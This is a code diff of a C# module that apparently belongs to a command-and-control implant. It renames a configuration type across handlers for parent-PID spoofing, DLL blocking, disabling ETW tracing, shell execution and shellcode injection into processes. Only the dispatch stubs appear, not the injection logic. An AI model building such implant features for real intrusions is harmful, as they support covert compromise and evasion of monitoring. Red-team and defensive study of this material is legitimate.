@@ -9,7 +9,6 @@ using Agent.Injection;
 using Agent.Interfaces;
 using Agent.Controllers;
 
-
 namespace Agent
 {
     public class AgentModule : IAgentModule
@@ -82,7 +81,7 @@ namespace Agent
             };
         }
 
-        public void Initialise(AgentController agent, ConfigurationController config)
+        public void Initialise(AgentController agent, ConfigController config)
         {
             var moduleInfo = GetModuleInfo();
             agent.RegisterAgentModule(moduleInfo);
@@ -97,37 +96,37 @@ namespace Agent
             agent.SendModuleRegistered(moduleInfo);
         }
 
-        private void HandlePPIDConfig(string data, AgentController agent, ConfigurationController config)
+        private void HandlePPIDConfig(string data, AgentController agent, ConfigController config)
         {
             PPID.SetConfig(data, agent, config);
         }
 
-        private void HandleBlockDllsConfig(string data, AgentController agent, ConfigurationController config)
+        private void HandleBlockDllsConfig(string data, AgentController agent, ConfigController config)
         {
             BlockDlls.SetConfig(data, agent, config);
         }
 
-        private void HandleDisableEtwConfig(string data, AgentController agent, ConfigurationController config)
+        private void HandleDisableEtwConfig(string data, AgentController agent, ConfigController config)
         {
             Etw.SetConfig(data, agent, config);
         }
 
-        private void HandleSpawnToConfig(string data, AgentController agent, ConfigurationController config)
+        private void HandleSpawnToConfig(string data, AgentController agent, ConfigController config)
         {
             SpawnTo.SetConfig(data, agent, config);
         }
 
-        private void HandleShellCommand(string data, AgentController agent, ConfigurationController config)
+        private void HandleShellCommand(string data, AgentController agent, ConfigController config)
         {
             LocalExecution.CreateProcessForShellRun(agent, config, data, true);
         }
 
-        private void HandleRunCommand(string data, AgentController agent, ConfigurationController config)
+        private void HandleRunCommand(string data, AgentController agent, ConfigController config)
         {
             LocalExecution.CreateProcessForShellRun(agent, config, data, false);
         }
 
-        private void HandleInject(string data, AgentController agent, ConfigurationController config)
+        private void HandleInject(string data, AgentController agent, ConfigController config)
         {
             var split = data.Split(' ');
             var pid = Convert.ToInt32(split[0]);
@@ -136,7 +135,7 @@ namespace Agent
             Bishop.Inject(shellcode, pid, true);
         }
 
-        private void HandleSpawn(string data, AgentController agent, ConfigurationController config)
+        private void HandleSpawn(string data, AgentController agent, ConfigController config)
         {
             var pid = LocalExecution.CreateSpawnToProcess(agent, config);
             Bishop.Inject(data, pid, false);
